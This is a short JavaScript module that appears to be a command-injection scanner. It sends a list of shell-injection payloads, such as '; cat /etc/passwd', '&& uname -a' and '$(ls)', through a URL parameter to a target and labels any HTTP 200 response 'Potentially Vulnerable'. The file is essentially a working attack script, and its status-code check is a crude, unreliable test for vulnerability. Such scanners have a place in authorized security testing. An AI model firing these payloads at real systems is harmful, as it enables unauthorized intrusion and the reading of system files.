const axios = require('axios');

const payloads = [
  '; ls', '; ls -la', '&& ls', '&& ls -la', '| ls', '| ls -la',
  '; cat /etc/passwd', '&& cat /etc/passwd', '| cat /etc/passwd',
  '; uname -a', '&& uname -a', '| uname -a',
  '; ping -c 1 127.0.0.1', '&& ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1',
  '$(ls)', '`ls`',
];

async function testCommandInjection(url, parameter) {
  const results = {};
  
  for (const payload of payloads) {
    const fullUrl = `${url}?${parameter}=${encodeURIComponent(payload)}`;
    try {
      const response = await axios.get(fullUrl);
      results[payload] = response.status === 200 ? 'Potentially Vulnerable' : `Status: ${response.status}`;
    } catch (error) {
      results[payload] = error.response ? `Status: ${error.response.status}` : 'Error';
    }
  }

  return results;
}

module.exports = testCommandInjection;
